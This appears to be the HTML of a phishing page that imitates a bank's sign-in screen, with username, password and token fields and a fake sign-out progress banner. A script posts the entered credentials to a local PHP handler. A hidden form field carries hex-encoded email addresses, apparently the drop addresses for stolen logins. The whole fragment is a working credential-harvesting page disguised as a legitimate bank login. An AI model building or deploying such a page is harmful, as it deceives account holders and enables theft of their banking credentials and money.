...
<script src="./style/js/srcen.min.js"></script>
...
<div id='yshys' class="jpui raised segment"><div class="row"><div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3></div></div> <div class="row"><div class="col-xs-12"><div class="progress"><div class="bar"></div></div></div></div></div> </div> <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
...
$("#spinarrrrrr").show();
					...
					$.post("./system/sand_login.php?ajax", $("#loginbank").serialize(), function(result) {
                            setTimeout(function() {
...
<form name="loginbank" id="loginbank" method="POST" autocomplete="off" action="#" novalidate="">
...
<label class="util accessible-text logon-xs-toggle error" for="userId-input-field" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Username</label> <div class="logon-xs-toggle" id="userId">
 ...
 <input  class="jpui input logon-xs-toggle " id="userbank" placeholder="Username"  type="text" name="userbank" required="required"   >  
  ...
  </div> <label class="util accessible-text logon-xs-toggle error" for="password-input-field" data-attr="LOGON.passwordPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Password</label> <div class="logon-xs-toggle" id="password"> 


<input  class="jpui input logon-xs-toggle " id="passwordbank" placeholder="Password" 
autocomplete="off" type="password" name="passwordbank" required="required"   > 
<input type="hidden" name="token" required="required" value="66656e6374696f6e40676d61696c2e636f6d2c66656e6374696f6e407961686f6f2e636f6d">




  </div> <label class="util accessible-text logon-xs-toggle" for="securityToken-input-field" data-attr="LOGON.securityTokenPlaceholder"><span class="accessible-text errorAdaText"></span>Token</label> <div class="logon-xs-toggle hidden" id="securityToken"> <input min="0" class="jpui input logon-xs-toggle" id="securityToken-input-field" placeholder="Token" format="" aria-describedby="securityToken-placeHolderAdaText securityToken-helpertext" autocomplete="off" maxlength="6" type="tel" name="securityToken" data-validate="securityToken" required="" value="">    <span class="util accessible-text validation__accessible-text" id="securityToken-placeHolderAdaText"> Token</span></div> <div class="row logon-xs-toggle"><div class="col-xs-6 rememberMe-checkbox-container"><div class="jpui checkbox" id="rememberMe"><div class="checkbox-flex"><div class="checkboxWrap"><input class="checkbox__input" type="checkbox" id="input-rememberMe" aria-label="This checked box means that we will remember your username.  Remember me" name="rememberMe" value="on" data-attr="LOGON.rememberMyUserId"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div> <label for="input-rememberMe"> <span class="checkbox-label" id="label-rememberMe" data-attr="LOGON.rememberMyUserIdLabel">Remember me </span></label></div> </div></div> <div class="col-xs-6 token-checkbox-container"><div class="jpui checkbox useToken" id="useToken"><div class="checkbox-flex"><div class="checkboxWrap"><input class="checkbox__input" type="checkbox" id="input-useToken" aria-label="Shows content above. Use token" name="rsaToken" value="on"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div> <label for="input-useToken"> <span class="checkbox-label" id="label-useToken">Use token </span></label></div> </div></div></div> <div class="row"><button type="submit" id="signin-button" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage"><span class="label">Sign in</span> </button></div> <div class="row"><span class="jpui link" id="forgotPassword-link-wrapper"><a class="link-anchor" id="forgotPassword" href=" javascript:void(0);" aria-label=" Forgot username/password? " data-attr="LOGON.forgotPasswordNavigation">Forgot username/password?<i class="jpui progressright icon end-icon" id="forgotPassword-endIcon" aria-hidden="true"></i></a></span></div> <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last" id="enrollment" href=" javascript:void(0);" aria-label=" Not enrolled? Sign up now. " data-attr="LOGON.enrollNavigation">Not enrolled? Sign up now.<i class="jpui progressright icon end-icon" id="enrollment-endIcon" aria-hidden="true"></i></a></span></div></form>
